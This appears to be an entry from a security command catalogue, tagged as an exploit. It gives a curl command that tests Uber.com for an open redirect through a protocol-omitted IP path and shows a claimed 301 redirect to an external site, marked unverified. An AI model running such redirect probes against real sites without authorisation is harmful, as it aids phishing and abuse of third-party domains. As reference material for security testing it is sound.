---
id: cmd-curl-omit-protocol-redirect
data: 'curl -L -I "http://uber.com//216.58.217.206/calendar"'
tags:
  - redirect
  - exploit
type: command
output: |-
  HTTP/1.1 301 Moved Permanently
  Location: https://calendar.google.com/...
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:26.872Z'
verified: false
validated: true
submitted: true
---
# curl-omit-protocol-redirect

## Command

```bash
curl -L -I "http://uber.com//216.58.217.206/calendar"
```

## Description

Tests protocol-omitted IP redirect on Uber.com to achieve successful external navigation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-L` | Follow redirects | Yes |
| `-I` | Headers | Yes |
| URL | HTTP without protocol in IP | Yes |

## Examples

### Basic Usage

```bash
curl -L -I "http://uber.com//216.58.217.206/calendar"
```

## Expected Output

Redirect to target site without errors.

## Related

- [[Related Procedure: Exploit-IP-Based-Redirect]]
